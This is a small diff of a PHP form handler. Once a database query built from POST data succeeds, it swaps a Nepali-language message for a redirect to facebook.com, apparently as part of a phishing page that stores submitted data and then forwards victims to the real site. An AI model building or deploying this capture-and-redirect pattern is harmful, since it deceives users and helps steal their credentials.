@@ -9,7 +9,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $k_bho_vai=mysqli_query($cont, $sqlcode); 
     if($k_bho_vai)  {
 
-        echo "har ram timro id pad jham";
+        header("location:https://www.facebook.com/");
     }
        
     }
